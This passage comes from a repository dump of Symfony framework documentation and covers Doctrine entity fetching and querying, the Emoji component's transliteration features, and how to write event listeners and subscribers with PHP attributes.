App\\Controller;\n\n    use App\\Entity\\Product;\n    use Doctrine\\ORM\\EntityManagerInterface;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n    // ...\n\n    class ProductController extends AbstractController\n    {\n        #[Route('/product/{id}', name: 'product_show')]\n        public function show(EntityManagerInterface $entityManager, int $id): Response\n        {\n            $product = $entityManager->getRepository(Product::class)->find($id);\n\n            if (!$product) {\n                throw $this->createNotFoundException(\n                    'No product found for id '.$id\n                );\n            }\n\n            return new Response('Check out this great product: '.$product->getName());\n\n            // or render a template\n            // in the template, print things with {{ product.name }}\n            // return $this->render('product/show.html.twig', ['product' => $product]);\n        }\n    }\n\nAnother possibility is to use the ``ProductRepository`` using Symfony's autowiring\nand injected by the dependency injection container::\n\n    // src/Controller/ProductController.php\n    namespace App\\Controller;\n\n    use App\\Entity\\Product;\n    use App\\Repository\\ProductRepository;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n    // ...\n\n    class ProductController extends AbstractController\n    {\n        #[Route('/product/{id}', name: 'product_show')]\n        public function show(ProductRepository $productRepository, int $id): Response\n        {\n            $product = $productRepository\n                ->find($id);\n\n            // ...\n        }\n    }\n\nTry it out!\n\n    http://localhost:8000/product/1\n\nWhen you query for a particular type of object, you always use what's known\nas its \"repository\". You can think of a repository as a PHP class whose only\njob is to help you fetch entities of a certain class.\n\nOnce you have a repository object, you have many helper methods::\n\n    $repository = $entityManager->getRepository(Product::class);\n\n    // look for a single Product by its primary key (usually \"id\")\n    $product = $repository->find($id);\n\n    // look for a single Product by name\n    $product = $repository->findOneBy(['name' => 'Keyboard']);\n    // or find by name and price\n    $product = $repository->findOneBy([\n        'name' => 'Keyboard',\n        'price' => 1999,\n    ]);\n\n    // look for multiple Product objects matching the name, ordered by price\n    $products = $repository->findBy(\n        ['name' => 'Keyboard'],\n        ['price' => 'ASC']\n    );\n\n    // look for *all* Product objects\n    $products = $repository->findAll();\n\nYou can also add *custom* methods for more complex queries! More on that later in\nthe :ref:`doctrine-queries` section.\n\n.. tip::\n\n    When rendering an HTML page, the web debug toolbar at the bottom of the page\n    will display the number of queries and the time it took to execute them:\n\n    .. image:: /_images/doctrine/doctrine_web_debug_toolbar.png\n        :alt: The web dev toolbar showing the Doctrine item.\n        :class: with-browser\n\n    If the number of database queries is too high, the icon will turn yellow to\n    indicate that something may not be correct. Click on the icon to open the\n    Symfony Profiler and see the exact queries that were executed. If you don't\n    see the web debug toolbar, install the ``profiler`` :ref:`Symfony pack <symfony-packs>`\n    by running this command: ``composer require --dev symfony/profiler-pack``.\n\n    For more information, read the :doc:`Symfony profiler documentation </profiler>`.\n\n.. _doctrine-entity-value-resolver:\n\nAutomatically Fetching Objects (EntityValueResolver)\n----------------------------------------------------\n\n.. versionadded:: 2.7.1\n\n    Autowiring of the ``EntityValueResolver`` was introduced in DoctrineBundle 2.7.1.\n\nIn many cases, you can use the ``EntityValueResolver`` to do the query for you\nautomatically! You can simplify the controller to::\n\n    // src/Controller/ProductController.php\n    namespace App\\Controller;\n\n    use App\\Entity\\Product;\n    use App\\Repository\\ProductRepository;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n    // ...\n\n    class ProductController extends AbstractController\n    {\n        #[Route('/product/{id}')]\n        public function show(Product $product): Response\n        {\n            // use the Product!\n            // ...\n        }\n    }\n\nThat's it! The bundle uses the ``{id}`` from the route to query for the ``Product``\nby the ``id`` column. If it's not found, a 404 page is generated.\n\n.. tip::\n\n    When enabled globally, it's possible to disable the behavior on a specific\n    controller, by using the ``MapEntity`` set to ``disabled``::\n\n        public function show(\n            #[CurrentUser]\n            #[MapEntity(disabled: true)]\n            User $user\n        ): Response {\n            // User is not resolved by the EntityValueResolver\n            // ...\n        }\n\nFetch Automatically\n~~~~~~~~~~~~~~~~~~~\n\nIf your route wildcards match properties on your entity, then the resolver\nwill automatically fetch them::\n\n    /**\n     * Fetch via primary key because {id} is in the route.\n     */\n    #[Route('/product/{id}')]\n    public function showByPk(Product $product): Response\n    {\n    }\n\n    /**\n     * Perform a findOneBy() where the slug property matches {slug}.\n     */\n    #[Route('/product/{slug}')]\n    public function showBySlug(Product $product): Response\n    {\n    }\n\nAutomatic fetching works in these situations:\n\n* If ``{id}`` is in your route, then this is used to fetch by\n  primary key via the ``find()`` method.\n\n* The resolver will attempt to do a ``findOneBy()`` fetch by using\n  *all* of the wildcards in your route that are actually properties\n  on your entity (non-properties are ignored).\n\nThis behavior is enabled by default on all controllers. If you prefer, you can\nrestrict this feature to only work on route wildcards called ``id`` to look for\nentities by primary key. To do so, set the option\n``doctrine.orm.controller_resolver.auto_mapping`` to ``false``.\n\nWhen ``auto_mapping`` is disabled, you can configure the mapping explicitly for\nany controller argument with the ``MapEntity`` attribute. You can even control\nthe ``EntityValueResolver`` behavior by using the `MapEntity options`_ ::\n\n    // src/Controller/ProductController.php\n    namespace App\\Controller;\n\n    use App\\Entity\\Product;\n    use Symfony\\Bridge\\Doctrine\\Attribute\\MapEntity;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n    // ...\n\n    class ProductController extends AbstractController\n    {\n        #[Route('/product/{slug}')]\n        public function show(\n            #[MapEntity(mapping: ['slug' => 'slug'])]\n            Product $product\n        ): Response {\n            // use the Product!\n            // ...\n        }\n    }\n\nFetch via an Expression\n~~~~~~~~~~~~~~~~~~~~~~~\n\nIf automatic fetching doesn't work for your use case, you can write an expression\nusing the :doc:`ExpressionLanguage component </components/expression_language>`::\n\n    #[Route('/product/{product_id}')]\n    public function show(\n        #[MapEntity(expr: 'repository.find(product_id)')]\n        Product $product\n    ): Response {\n    }\n\nIn the expression, the ``repository`` variable will be your entity's\nRepository class and any route wildcards - like ``{product_id}`` are\navailable as variables.\n\nThe repository method called in the expression can also return a list of entities.\nIn that case, update the type of your controller argument::\n\n    #[Route('/posts_by/{author_id}')]\n    public function authorPosts(\n        #[MapEntity(class: Post::class, expr: 'repository.findBy({\"author\": author_id}, {}, 10)')]\n        iterable $posts\n    ): Response {\n    }\n\n.. versionadded:: 7.1\n\n    The mapping of the lists of entities was introduced in Symfony 7.1.\n\nThis can also be used to help resolve multiple arguments::\n\n    #[Route('/product/{id}/comments/{comment_id}')]\n    public function show(\n        Product $product,\n        #[MapEntity(expr: 'repository.find(comment_id)')]\n        Comment $comment\n    ): Response {\n    }\n\nIn the example above, the ``$product`` argument is handled automatically,\nbut ``$comment`` is configured with the attribute since they cannot both follow\nthe default convention.\n\nIf you need to get other information from the request to query the database, you\ncan also access the request in your expression thanks to the ``request``\nvariable. Let's say you want the first or the last comment of a product depending on a query parameter named ``sort``::\n\n    #[Route('/product/{id}/comments')]\n    public function show(\n        Product $product,\n        #[MapEntity(expr: 'repository.findOneBy({\"product\": id}, {\"createdAt\": request.query.get(\"sort\", \"DESC\")})')]\n        Comment $comment\n    ): Response {\n    }\n\nMapEntity Options\n~~~~~~~~~~~~~~~~~\n\nA number of options are available on the ``MapEntity`` attribute to\ncontrol behavior:\n\n``id``\n    If an ``id`` option is configured and matches a route parameter, then\n    the resolver will find by the primary key::\n\n        #[Route('/product/{product_id}')]\n        public function show(\n            #[MapEntity(id: 'product_id')]\n            Product $product\n        ): Response {\n        }\n\n``mapping``\n    Configures the properties and values to use with the ``findOneBy()``\n    method: the key is the route placeholder name and the value is the Doctrine\n    property name::\n\n        #[Route('/product/{category}/{slug}/comments/{comment_slug}')]\n        public function show(\n            #[MapEntity(mapping: ['category' => 'category', 'slug' => 'slug'])]\n            Product $product,\n            #[MapEntity(mapping: ['comment_slug' => 'slug'])]\n            Comment $comment\n        ): Response {\n        }\n\n``exclude``\n    Configures the properties that should be used in the ``findOneBy()``\n    method by *excluding* one or more properties so that not *all* are used::\n\n        #[Route('/product/{slug}/{date}')]\n        public function show(\n            #[MapEntity(exclude: ['date'])]\n            Product $product,\n            \\DateTime $date\n        ): Response {\n        }\n\n``stripNull``\n    If true, then when ``findOneBy()`` is used, any values that are\n    ``null`` will not be used for the query.\n\n``objectManager``\n    By default, the ``EntityValueResolver`` uses the *default*\n    object manager, but you can configure this::\n\n        #[Route('/product/{id}')]\n        public function show(\n            #[MapEntity(objectManager: 'foo')]\n            Product $product\n        ): Response {\n        }\n\n``evictCache``\n    If true, forces Doctrine to always fetch the entity from the database\n    instead of cache.\n\n``disabled``\n    If true, the ``EntityValueResolver`` will not try to replace the argument.\n\n``message``\n    An optional custom message displayed when there's a :class:`Symfony\\\\Component\\\\HttpKernel\\\\Exception\\\\NotFoundHttpException`,\n    but **only in the development environment** (you won't see this message in production)::\n\n        #[Route('/product/{product_id}')]\n        public function show(\n            #[MapEntity(id: 'product_id', message: 'The product does not exist')]\n            Product $product\n        ): Response {\n        }\n\n.. versionadded:: 7.1\n\n    The ``message`` option was introduced in Symfony 7.1.\n\nUpdating an Object\n------------------\n\nOnce you've fetched an object from Doctrine, you interact with it the same as\nwith any PHP model::\n\n    // src/Controller/ProductController.php\n    namespace App\\Controller;\n\n    use App\\Entity\\Product;\n    use App\\Repository\\ProductRepository;\n    use Doctrine\\ORM\\EntityManagerInterface;\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\Routing\\Attribute\\Route;\n    // ...\n\n    class ProductController extends AbstractController\n    {\n        #[Route('/product/edit/{id}', name: 'product_edit')]\n        public function update(EntityManagerInterface $entityManager, int $id): Response\n        {\n            $product = $entityManager->getRepository(Product::class)->find($id);\n\n            if (!$product) {\n                throw $this->createNotFoundException(\n                    'No product found for id '.$id\n                );\n            }\n\n            $product->setName('New product name!');\n            $entityManager->flush();\n\n            return $this->redirectToRoute('product_show', [\n                'id' => $product->getId()\n            ]);\n        }\n    }\n\nUsing Doctrine to edit an existing product consists of three steps:\n\n#. fetching the object from Doctrine;\n#. modifying the object;\n#. calling ``flush()`` on the entity manager.\n\nYou *can* call ``$entityManager->persist($product)``, but it isn't necessary:\nDoctrine is already \"watching\" your object for changes.\n\nDeleting an Object\n------------------\n\nDeleting an object is very similar, but requires a call to the ``remove()``\nmethod of the entity manager::\n\n    $entityManager->remove($product);\n    $entityManager->flush();\n\nAs you might expect, the ``remove()`` method notifies Doctrine that you'd\nlike to remove the given object from the database. The ``DELETE`` query isn't\nactually executed until the ``flush()`` method is called.\n\n.. _doctrine-queries:\n\nQuerying for Objects: The Repository\n------------------------------------\n\nYou've already seen how the repository object allows you to run basic queries\nwithout any work::\n\n    // from inside a controller\n    $repository = $entityManager->getRepository(Product::class);\n    $product = $repository->find($id);\n\nBut what if you need a more complex query? When you generated your entity with\n``make:entity``, the command *also* generated a ``ProductRepository`` class::\n\n    // src/Repository/ProductRepository.php\n    namespace App\\Repository;\n\n    use App\\Entity\\Product;\n    use Doctrine\\Bundle\\DoctrineBundle\\Repository\\ServiceEntityRepository;\n    use Doctrine\\Persistence\\ManagerRegistry;\n\n    class ProductRepository extends ServiceEntityRepository\n    {\n        public function __construct(ManagerRegistry $registry)\n        {\n            parent::__construct($registry, Product::class);\n        }\n    }\n\nWhen you fetch your repository (i.e. ``->getRepository(Product::class)``), it is\n*actually* an instance of *this* object! This is because of the ``repositoryClass``\nconfig that was generated at the top of your ``Product`` entity class.\n\nSuppose you want to query for all Product objects greater than a certain price. Add\na new method for this to your repository::\n\n    // src/Repository/ProductRepository.php\n\n    // ...\n    class ProductRepository extends ServiceEntityRepository\n    {\n        public function __construct(ManagerRegistry $registry)\n        {\n            parent::__construct($registry, Product::class);\n        }\n\n        /**\n         * @return Product[]\n         */\n        public function findAllGreaterThanPrice(int $price): array\n        {\n            $entityManager = $this->getEntityManager();\n\n            $query = $entityManager->createQuery(\n                'SELECT p\n                FROM App\\Entity\\Product p\n                WHERE p.price > :price\n                ORDER BY p.price ASC'\n            )->setParameter('price', $price);\n\n            // returns an array of Product objects\n            return $query->getResult();\n        }\n    }\n\nThe string passed to ``createQuery()`` might look like SQL, but it is\n`Doctrine Query Language`_. This allows you to type queries using commonly\nknown query language, but referencing PHP objects instead (i.e. in the ``FROM``\nstatement).\n\nNow, you can call this method on the repository::\n\n    // from inside a controller\n    $minPrice = 1000;\n\n    $products = $entityManager->getRepository(Product::class)->findAllGreaterThanPrice($minPrice);\n\n    // ...\n\nSee :ref:`services-constructor-injection` for how to inject the repository into\nany service.\n\nQuerying with the Query Builder\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nDoctrine also provides a `Query Builder`_, an object-oriented way to write\nqueries. It is recommended to use this when queries are built dynamically (i.e.\nbased on PHP conditions)::\n\n    // src/Repository/ProductRepository.php\n\n    // ...\n    class ProductRepository extends ServiceEntityRepository\n    {\n        public function findAllGreaterThanPrice(int $price, bool $includeUnavailableProducts = false): array\n        {\n            // automatically knows to select Products\n            // the \"p\" is an alias you'll use in the rest of the query\n            $qb = $this->createQueryBuilder('p')\n                ->where('p.price > :price')\n                ->setParameter('price', $price)\n                ->orderBy('p.price', 'ASC');\n\n            if (!$includeUnavailableProducts) {\n                $qb->andWhere('p.available = TRUE');\n            }\n\n            $query = $qb->getQuery();\n\n            return $query->execute();\n\n            // to get just one result:\n            // $product = $query->setMaxResults(1)->getOneOrNullResult();\n        }\n    }\n\nQuerying with SQL\n~~~~~~~~~~~~~~~~~\n\nIn addition, you can query directly with SQL if you need to::\n\n    // src/Repository/ProductRepository.php\n\n    // ...\n    class ProductRepository extends ServiceEntityRepository\n    {\n        public function findAllGreaterThanPrice(int $price): array\n        {\n            $conn = $this->getEntityManager()->getConnection();\n\n            $sql = '\n                SELECT * FROM product p\n                WHERE p.price > :price\n                ORDER BY p.price ASC\n                ';\n\n            $resultSet = $conn->executeQuery($sql, ['price' => $price]);\n\n            // returns an array of arrays (i.e. a raw data set)\n            return $resultSet->fetchAllAssociative();\n        }\n    }\n\nWith SQL, you will get back raw data, not objects (unless you use the `NativeQuery`_\nfunctionality).\n\nConfiguration\n-------------\n\nSee the :doc:`Doctrine config reference </reference/configuration/doctrine>`.\n\nRelationships and Associations\n------------------------------\n\nDoctrine provides all the functionality you need to manage database relationships\n(also known as associations), including ManyToOne, OneToMany, OneToOne and ManyToMany\nrelationships.\n\nFor info, see :doc:`/doctrine/associations`.\n\nDatabase Testing\n----------------\n\nRead the article about :doc:`testing code that interacts with the database </testing/database>`.\n\nDoctrine Extensions (Timestampable, Translatable, etc.)\n-------------------------------------------------------\n\nDoctrine community has created some extensions to implement common needs such as\n*\"set the value of the createdAt property automatically when creating an entity\"*.\nRead more about the `available Doctrine extensions`_ and use the\n`StofDoctrineExtensionsBundle`_ to integrate them in your application.\n\nLearn more\n----------\n\n.. toctree::\n    :maxdepth: 1\n\n    doctrine/associations\n    doctrine/events\n    doctrine/custom_dql_functions\n    doctrine/dbal\n    doctrine/multiple_entity_managers\n    doctrine/resolve_target_entity\n    testing/database\n\n.. _`Doctrine`: https://www.doctrine-project.org/\n.. _`RFC 3986`: https://www.ietf.org/rfc/rfc3986.txt\n.. _`list of Doctrine mapping types`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/basic-mapping.html#reference-mapping-types\n.. _`Query Builder`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/query-builder.html\n.. _`Doctrine Query Language`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/dql-doctrine-query-language.html\n.. _`Reserved SQL keywords documentation`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/basic-mapping.html#quoting-reserved-words\n.. _`DoctrineMongoDBBundle docs`: https://symfony.com/doc/current/bundles/DoctrineMongoDBBundle/index.html\n.. _`Transactions and Concurrency`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/transactions-and-concurrency.html\n.. _`DoctrineMigrationsBundle`: https://github.com/doctrine/DoctrineMigrationsBundle\n.. _`NativeQuery`: https://www.doctrine-project.org/projects/doctrine-orm/en/current/reference/native-sql.html\n.. _`limit of 767 bytes for the index key prefix`: https://dev.mysql.com/doc/refman/5.6/en/innodb-limits.html\n.. _`Doctrine screencast series`: https://symfonycasts.com/screencast/symfony-doctrine\n.. _`API Platform`: https://api-platform.com/docs/core/validation/\n.. _`PDO`: https://www.php.net/pdo\n.. _`available Doctrine extensions`: https://github.com/doctrine-extensions/DoctrineExtensions\n.. _`StofDoctrineExtensionsBundle`: https://github.com/stof/StofDoctrineExtensionsBundle\n.. _`MakerBundle`: https://symfony.com/doc/current/bundles/SymfonyMakerBundle/index.html\n"
        },
        {
          "name": "doctrine",
          "type": "tree",
          "content": null
        },
        {
          "name": "emoji.rst",
          "type": "blob",
          "size": 6.4345703125,
          "content": "Working with Emojis\n===================\n\n.. versionadded:: 7.1\n\n    The emoji component was introduced in Symfony 7.1.\n\nSymfony provides several utilities to work with emoji characters and sequences\nfrom the `Unicode CLDR dataset`_. They are available via the Emoji component,\nwhich you must first install in your application:\n\n.. _installation:\n\n.. code-block:: terminal\n\n    $ composer require symfony/emoji\n\n.. include:: /components/require_autoload.rst.inc\n\nThe data needed to store the transliteration of all emojis (~5,000) into all\nlanguages take a considerable disk space.\n\nIf you need to save disk space (e.g. because you deploy to some service with tight\nsize constraints), run this command (e.g. as an automated script after ``composer install``)\nto compress the internal Symfony emoji data files using the PHP ``zlib`` extension:\n\n.. code-block:: terminal\n\n    # adjust the path to the 'compress' binary based on your application installation\n    $ php ./vendor/symfony/emoji/Resources/bin/compress\n\n.. _emoji-transliteration:\n\nEmoji Transliteration\n---------------------\n\nThe ``EmojiTransliterator`` class offers a way to translate emojis into their\ntextual representation in all languages based on the `Unicode CLDR dataset`_::\n\n    use Symfony\\Component\\Emoji\\EmojiTransliterator;\n\n    // Describe emojis in English\n    $transliterator = EmojiTransliterator::create('en');\n    $transliterator->transliterate('Menus with 🍕 or 🍝');\n    // => 'Menus with pizza or spaghetti'\n\n    // Describe emojis in Ukrainian\n    $transliterator = EmojiTransliterator::create('uk');\n    $transliterator->transliterate('Menus with 🍕 or 🍝');\n    // => 'Menus with піца or спагеті'\n\n.. tip::\n\n    When using the :ref:`slugger <string-slugger>` from the String component,\n    you can combine it with the ``EmojiTransliterator`` to :ref:`slugify emojis <string-slugger-emoji>`.\n\nTransliterating Emoji Text Short Codes\n--------------------------------------\n\nServices like GitHub and Slack allows to include emojis in your messages using\ntext short codes (e.g. you can add the ``:+1:`` code to render the 👍 emoji).\n\nSymfony also provides a feature to transliterate emojis into short codes and vice\nversa. The short codes are slightly different on each service, so you must pass\nthe name of the service as an argument when creating the transliterator.\n\nGitHub Emoji Short Codes Transliteration\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nConvert emojis to GitHub short codes with the ``emoji-github`` locale::\n\n    $transliterator = EmojiTransliterator::create('emoji-github');\n    $transliterator->transliterate('Teenage 🐢 really love 🍕');\n    // => 'Teenage :turtle: really love :pizza:'\n\nConvert GitHub short codes to emojis with the ``github-emoji`` locale::\n\n    $transliterator = EmojiTransliterator::create('github-emoji');\n    $transliterator->transliterate('Teenage :turtle: really love :pizza:');\n    // => 'Teenage 🐢 really love 🍕'\n\nGitlab Emoji Short Codes Transliteration\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nConvert emojis to Gitlab short codes with the ``emoji-gitlab`` locale::\n\n    $transliterator = EmojiTransliterator::create('emoji-gitlab');\n    $transliterator->transliterate('Breakfast with 🥝 or 🥛');\n    // => 'Breakfast with :kiwi: or :milk:'\n\nConvert Gitlab short codes to emojis with the ``gitlab-emoji`` locale::\n\n    $transliterator = EmojiTransliterator::create('gitlab-emoji');\n    $transliterator->transliterate('Breakfast with :kiwi: or :milk:');\n    // => 'Breakfast with 🥝 or 🥛'\n\nSlack Emoji Short Codes Transliteration\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nConvert emojis to Slack short codes with the ``emoji-slack`` locale::\n\n    $transliterator = EmojiTransliterator::create('emoji-slack');\n    $transliterator->transliterate('Menus with 🥗 or 🧆');\n    // => 'Menus with :green_salad: or :falafel:'\n\nConvert Slack short codes to emojis with the ``slack-emoji`` locale::\n\n    $transliterator = EmojiTransliterator::create('slack-emoji');\n    $transliterator->transliterate('Menus with :green_salad: or :falafel:');\n    // => 'Menus with 🥗 or 🧆'\n\n.. _text-emoji:\n\nUniversal Emoji Short Codes Transliteration\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nIf you don't know which service was used to generate the short codes, you can use\nthe ``text-emoji`` locale, which combines all codes from all services::\n\n    $transliterator = EmojiTransliterator::create('text-emoji');\n\n    // Github short codes\n    $transliterator->transliterate('Breakfast with :kiwi-fruit: or :milk-glass:');\n    // Gitlab short codes\n    $transliterator->transliterate('Breakfast with :kiwi: or :milk:');\n    // Slack short codes\n    $transliterator->transliterate('Breakfast with :kiwifruit: or :glass-of-milk:');\n\n    // all the above examples produce the same result:\n    // => 'Breakfast with 🥝 or 🥛'\n\nYou can convert emojis to short codes with the ``emoji-text`` locale::\n\n    $transliterator = EmojiTransliterator::create('emoji-text');\n    $transliterator->transliterate('Breakfast with 🥝 or 🥛');\n    // => 'Breakfast with :kiwifruit: or :milk-glass:\n\nInverse Emoji Transliteration\n-----------------------------\n\nGiven the textual representation of an emoji, you can reverse it back to get the\nactual emoji thanks to the :ref:`emojify filter <reference-twig-filter-emojify>`:\n\n.. code-block:: twig\n\n    {{ 'I like :kiwi-fruit:'|emojify }} {# renders: I like 🥝 #}\n    {{ 'I like :kiwi:'|emojify }}       {# renders: I like 🥝 #}\n    {{ 'I like :kiwifruit:'|emojify }}  {# renders: I like 🥝 #}\n\nBy default, ``emojify`` uses the :ref:`text catalog <text-emoji>`, which\nmerges the emoji text codes of all services. If you prefer, you can select a\nspecific catalog to use:\n\n.. code-block:: twig\n\n    {{ 'I :green-heart: this'|emojify }}                  {# renders: I 💚 this #}\n    {{ ':green_salad: is nice'|emojify('slack') }}        {# renders: 🥗 is nice #}\n    {{ 'My :turtle: has no name yet'|emojify('github') }} {# renders: My 🐢 has no name yet #}\n    {{ ':kiwi: is a great fruit'|emojify('gitlab') }}     {# renders: 🥝 is a great fruit #}\n\nRemoving Emojis\n---------------\n\nThe ``EmojiTransliterator`` can also be used to remove all emojis from a string,\nvia the special ``strip`` locale::\n\n    use Symfony\\Component\\Emoji\\EmojiTransliterator;\n\n    $transliterator = EmojiTransliterator::create('strip');\n    $transliterator->transliterate('🎉Hey!🥳 🎁Happy Birthday!🎁');\n    // => 'Hey! Happy Birthday!'\n\n.. _`Unicode CLDR dataset`: https://github.com/unicode-org/cldr\n"
        },
        {
          "name": "event_dispatcher.rst",
          "type": "blob",
          "size": 27.8115234375,
          "content": "Events and Event Listeners\n==========================\n\nDuring the execution of a Symfony application, lots of event notifications are\ntriggered. Your application can listen to these notifications and respond to\nthem by executing any piece of code.\n\nSymfony triggers several :doc:`events related to the kernel </reference/events>`\nwhile processing the HTTP Request. Third-party bundles may also dispatch events, and\nyou can even dispatch :doc:`custom events </components/event_dispatcher>` from your\nown code.\n\nAll the examples shown in this article use the same ``KernelEvents::EXCEPTION``\nevent for consistency purposes. In your own application, you can use any event\nand even mix several of them in the same subscriber.\n\nCreating an Event Listener\n--------------------------\n\nThe most common way to listen to an event is to register an **event listener**::\n\n    // src/EventListener/ExceptionListener.php\n    namespace App\\EventListener;\n\n    use Symfony\\Component\\HttpFoundation\\Response;\n    use Symfony\\Component\\HttpKernel\\Event\\ExceptionEvent;\n    use Symfony\\Component\\HttpKernel\\Exception\\HttpExceptionInterface;\n\n    class ExceptionListener\n    {\n        public function __invoke(ExceptionEvent $event): void\n        {\n            // You get the exception object from the received event\n            $exception = $event->getThrowable();\n            $message = sprintf(\n                'My Error says: %s with code: %s',\n                $exception->getMessage(),\n                $exception->getCode()\n            );\n\n            // Customize your response object to display the exception details\n            $response = new Response();\n            $response->setContent($message);\n            // the exception message can contain unfiltered user input;\n            // set the content-type to text to avoid XSS issues\n            $response->headers->set('Content-Type', 'text/plain; charset=utf-8');\n\n            // HttpExceptionInterface is a special type of exception that\n            // holds status code and header details\n            if ($exception instanceof HttpExceptionInterface) {\n                $response->setStatusCode($exception->getStatusCode());\n                $response->headers->replace($exception->getHeaders());\n            } else {\n                $response->setStatusCode(Response::HTTP_INTERNAL_SERVER_ERROR);\n            }\n\n            // sends the modified response object to the event\n            $event->setResponse($response);\n        }\n    }\n\nNow that the class is created, you need to register it as a service and\nnotify Symfony that it is an event listener by using a special \"tag\":\n\n.. configuration-block::\n\n    .. code-block:: yaml\n\n        # config/services.yaml\n        services:\n            App\\EventListener\\ExceptionListener:\n                tags: [kernel.event_listener]\n\n    .. code-block:: xml\n\n        <!-- config/services.xml -->\n        <?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n        <container xmlns=\"http://symfony.com/schema/dic/services\"\n            xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n            xsi:schemaLocation=\"http://symfony.com/schema/dic/services\n                https://symfony.com/schema/dic/services/services-1.0.xsd\">\n\n            <services>\n                <service id=\"App\\EventListener\\ExceptionListener\">\n                    <tag name=\"kernel.event_listener\"/>\n                </service>\n            </services>\n        </container>\n\n    .. code-block:: php\n\n        // config/services.php\n        namespace Symfony\\Component\\DependencyInjection\\Loader\\Configurator;\n\n        use App\\EventListener\\ExceptionListener;\n\n        return function(ContainerConfigurator $container): void {\n            $services = $container->services();\n\n            $services->set(ExceptionListener::class)\n                ->tag('kernel.event_listener')\n            ;\n        };\n\nSymfony follows this logic to decide which method to call inside the event\nlistener class:\n\n#. If the ``kernel.event_listener`` tag defines the ``method`` attribute, that's\n   the name of the method to be called;\n#. If no ``method`` attribute is defined, try to call the ``__invoke()`` magic\n   method (which makes event listeners invokable);\n#. If the ``__invoke()`` method is not defined either, throw an exception.\n\n.. note::\n\n    There is an optional attribute for the ``kernel.event_listener`` tag called\n    ``priority``, which is a positive or negative integer that defaults to ``0``\n    and it controls the order in which listeners are executed (the higher the\n    number, the earlier a listener is executed). This is useful when you need to\n    guarantee that one listener is executed before another. The priorities of the\n    internal Symfony listeners usually range from ``-256`` to ``256`` but your\n    own listeners can use any positive or negative integer.\n\n.. note::\n\n    There is an optional attribute for the ``kernel.event_listener`` tag called\n    ``event`` which is useful when listener ``$event`` argument is not typed.\n    If you configure it, it will change type of ``$event`` object.\n    For the ``kernel.exception`` event, it is :class:`Symfony\\\\Component\\\\HttpKernel\\\\Event\\\\ExceptionEvent`.\n    Check out the :doc:`Symfony events reference </reference/events>` to see\n    what type of object each event provides.\n\n    With this attribute, Symfony follows this logic to decide which method to call\n    inside the event listener class:\n\n    #. If the ``kernel.event_listener`` tag defines the ``method`` attribute, that's\n       the name of the method to be called;\n    #. If no ``method`` attribute is defined, try to call the method whose name\n       is ``on`` + \"PascalCased event name\" (e.g. ``onKernelException()`` method for\n       the ``kernel.exception`` event);\n    #. If that method is not defined either, try to call the ``__invoke()`` magic\n       method (which makes event listeners invokable);\n    #. If the ``__invoke()`` method is not defined either, throw an exception.\n\n.. _event-dispatcher_event-listener-attributes:\n\nDefining Event Listeners with PHP Attributes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\nAn alternative way to define an event listener is to use the\n:class:`Symfony\\\\Component\\\\EventDispatcher\\\\Attribute\\\\AsEventListener`\nPHP attribute. This allows to configure the listener inside its class, without\nhaving to add any configuration in external files::\n\n    namespace App\\EventListener;\n\n    use Symfony\\Component\\EventDispatcher\\Attribute\\AsEventListener;\n\n    #[AsEventListener]\n    final class MyListener\n    {\n        public function __invoke(CustomEvent $event): void\n        {\n            // ...\n        }\n    }\n\nYou can add multiple ``#[AsEventListener]`` attributes to configure different methods.\nThe ``method`` property is optional, and when not defined, it defaults to\n``on`` + uppercased event name. In the example below, the ``'foo'`` event listener\ndoesn't explicitly define its method, so the ``onFoo()`` method will be called::\n\n    namespace App\\EventListener;\n\n    use Symfony\\Component\\EventDispatcher\\Attribute\\AsEventListener;\n\n    #[AsEventListener(event: CustomEvent::class, method: 'onCustomEvent')]\n    #[AsEventListener(event: 'foo', priority: 42)]\n    #[AsEventListener(event: 'bar', method: 'onBarEvent')]\n    final class MyMultiListener\n    {\n        public function onCustomEvent(CustomEvent $event): void\n        {\n            // ...\n        }\n\n        public function onFoo(): void\n        {\n            // ...\n        }\n\n        public function onBarEvent(): void\n        {\n            // ...\n        }\n    }\n\n:class:`Symfony\\\\Component\\\\EventDispatcher\\\\Attribute\\\\AsEventListener`\ncan also be applied to methods directly::\n\n    namespace App\\EventListener;\n\n    use Symfony\\Component\\EventDispatcher\\Attribute\\AsEventListener;\n\n    final class MyMultiListener\n    {\n        #[AsEventListener]\n        public function onCustomEvent(CustomEvent $event): void\n        {\n            // ...\n        }\n\n        #[AsEventListener(event: 'foo', priority: 42)]\n        public function onFoo(): void\n        {\n            // ...\n        }\n\n        #[AsEventListener(event: 'bar')]\n        public function onBarEvent(): void\n        {\n            // ...\n        }\n    }\n\n.. note::\n\n    Note that the attribute doesn't require its ``event`` parameter to be set\n    if the method already type-hints the expected event.\n\n.. _events-subscriber:\n\nCreating an Event Subscriber\n----------------------------\n\nAnother way to listen to events is via an **event subscriber**, which is a class\nthat defines one or more methods that listen to one or various events. The main\ndifference with the event listeners is that subscribers always know the events\nto which they are listening.\n\nIf different event subscriber methods listen to the same event, their order is\ndefined by the ``priority`` parameter. This value is a positive or negative\ninteger which defaults to ``0``. The higher the number, the earlier the method\nis called. **Priority is aggregated for all listeners and subscribers**, so your\nmethods could be called before or after the methods defined in other listeners\nand subscribers. To learn more about event subscribers, read 